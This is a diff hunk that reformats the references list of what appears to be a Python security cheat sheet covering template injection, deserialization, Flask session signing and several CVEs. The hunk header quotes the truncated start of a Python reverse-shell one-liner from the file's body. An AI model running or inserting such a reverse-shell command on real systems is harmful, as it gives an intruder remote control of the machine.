@@ -328,16 +328,16 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ## 8. References
 
-- Python official docs: https://docs.python.org/3/
-- HackTricks - Python: https://book.hacktricks.xyz/pentesting-web/deserialization
-- PayloadsAllTheThings - SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- PayloadsAllTheThings - Python: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Python%20Serialization
-- flask-unsign: https://github.com/Paradoxis/Flask-Unsign
-- CVE-2019-14322: https://nvd.nist.gov/vuln/detail/CVE-2019-14322
-- CVE-2021-45115: https://nvd.nist.gov/vuln/detail/CVE-2021-45115
-- CVE-2021-33026: https://nvd.nist.gov/vuln/detail/CVE-2021-33026
-- CVE-2019-10906: https://nvd.nist.gov/vuln/detail/CVE-2019-10906
-- CVE-2024-34064: https://nvd.nist.gov/vuln/detail/CVE-2024-34064
-- CVE-2022-24856: https://nvd.nist.gov/vuln/detail/CVE-2022-24856
+- Python official docs - https://docs.python.org/3/
+- HackTricks - Python - https://book.hacktricks.xyz/pentesting-web/deserialization
+- PayloadsAllTheThings - SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+- PayloadsAllTheThings - Python - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Python%20Serialization
+- flask-unsign - https://github.com/Paradoxis/Flask-Unsign
+- CVE-2019-14322 - https://nvd.nist.gov/vuln/detail/CVE-2019-14322
+- CVE-2021-45115 - https://nvd.nist.gov/vuln/detail/CVE-2021-45115
+- CVE-2021-33026 - https://nvd.nist.gov/vuln/detail/CVE-2021-33026
+- CVE-2019-10906 - https://nvd.nist.gov/vuln/detail/CVE-2019-10906
+- CVE-2024-34064 - https://nvd.nist.gov/vuln/detail/CVE-2024-34064
+- CVE-2022-24856 - https://nvd.nist.gov/vuln/detail/CVE-2022-24856
 
 ---
